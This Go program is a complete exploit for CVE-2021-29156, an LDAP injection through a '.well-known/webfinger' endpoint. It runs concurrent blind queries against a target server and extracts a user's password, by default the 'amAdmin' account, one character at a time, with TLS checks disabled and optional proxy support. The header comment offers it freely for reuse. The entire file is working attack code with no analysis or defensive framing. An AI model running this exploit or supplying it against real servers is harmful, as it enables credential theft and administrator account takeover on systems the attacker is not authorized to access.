// It is an LDAP Injection and a CVE. Please refer to the LICENSE to know
// that I'd like a shoutout but you basically can do whatever you please
// with this code. I guess nobody even care about this top comment lol.
package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path"
	"sync"
	"time"
)

const (
	// charset will be out charset... cool isn't it? all the chars that will be tested are here
	DefaultCharset      = `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890$+/.=`
	NextCharPayload     = "(sunKeyValue=userPassword=%s*)(%%2526&rel=http://openid.net/specs/connect/1.0/issuer"
	CheckCrackedPayload = "(sunKeyValue=userPassword=%s)(%%2526&rel=http://openid.net/specs/connect/1.0/issuer"
)

// Engine will be our main component containing shared info and such
type Engine struct {
	Client  *http.Client
	Target  string
	Threads int
}

func NewEngine(client *http.Client, user, target string, threads int) (*Engine, error) {
	u, err := url.Parse(target)
	if err != nil {
		return nil, err
	}
	u.Path = path.Join(u.Path, ".well-known/webfinger")
	u.RawQuery = fmt.Sprintf("resource=http://x/%s)", user)

	return &Engine{
		Client:  client,
		Target:  u.String(),
		Threads: threads,
	}, nil
}

func (e *Engine) request(ctx context.Context, fullURL string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
	if err != nil {
		fmt.Println("ERROR:", err)
		return false
	}
	res, err := e.Client.Do(req)
	if err != nil {
		return false
	}
	return res.StatusCode == 200
}

func (e *Engine) checkCracked(password string) bool {
	return e.request(context.Background(), e.Target+fmt.Sprintf(CheckCrackedPayload, url.QueryEscape(password)))
}

func (e *Engine) checkNextChar(ctx context.Context, password, tentative string, correct chan string) {
	if e.request(ctx, e.Target+fmt.Sprintf(NextCharPayload, url.QueryEscape(password+tentative))) {
		correct <- tentative
	}
}

func (e *Engine) Loop(password string) (string, error) {
	if password != "" && e.checkCracked(password) {
		return password, nil
	}
	nextc := make(chan string, 1)
	found := make(chan string, 1)
	guard := make(chan struct{}, e.Threads)
	waitg := &sync.WaitGroup{}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var stop bool = false
	go func(s *bool) {
		tmp := <-found
		*s = true
		nextc <- tmp
	}(&stop)

	for _, c := range DefaultCharset {
		if !stop {
			guard <- struct{}{}
			waitg.Add(1)
			go func(char rune) {
				e.checkNextChar(ctx, password, string(char), found)
				waitg.Done()
				<-guard
			}(c)
		}
	}

	notfound := make(chan struct{}, 1)
	go func() {
		waitg.Wait()
		time.Sleep(3 * time.Second)
		notfound <- struct{}{}
	}()

	select {
	case nextChar := <-nextc:
		cancel()
		fmt.Println("Found char, password:", password+nextChar)
		return e.Loop(password + nextChar)
	case <-notfound:
		return password, fmt.Errorf("unable to get next char")
	}
}

func main() {
	var user, target, password string
	var threads int
	trn := http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	set := flag.NewFlagSet("CVE-2021-29156", flag.ExitOnError)
	set.Func("proxy", "proxy to use, eg: http://127.0.0.1:8080", func(s string) error {
		proxy, err := url.Parse(s)
		if err != nil {
			return err
		}
		trn.Proxy = http.ProxyURL(proxy)
		return nil
	})
	set.StringVar(&user, "user", "amAdmin", "target username")
	set.StringVar(&password, "partial", "", "partial password")
	set.StringVar(&target, "url", "", "target host, eg: http://example.com/")
	set.IntVar(&threads, "threads", 6, "threads to use")
	set.Parse(os.Args[1:])

	if target == "" {
		set.Usage()
		fmt.Println("please provide a target")
		os.Exit(1)
	}

	client := &http.Client{
		Transport: &trn,
		Timeout:   10 * time.Second,
	}

	engine, err := NewEngine(client, user, target, threads)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	res, err := engine.Loop(password)
	if err != nil {
		fmt.Println(err)
		fmt.Println("recovered password so far:", res)
	} else {
		fmt.Println("successfully cracked:", res)
	}
}
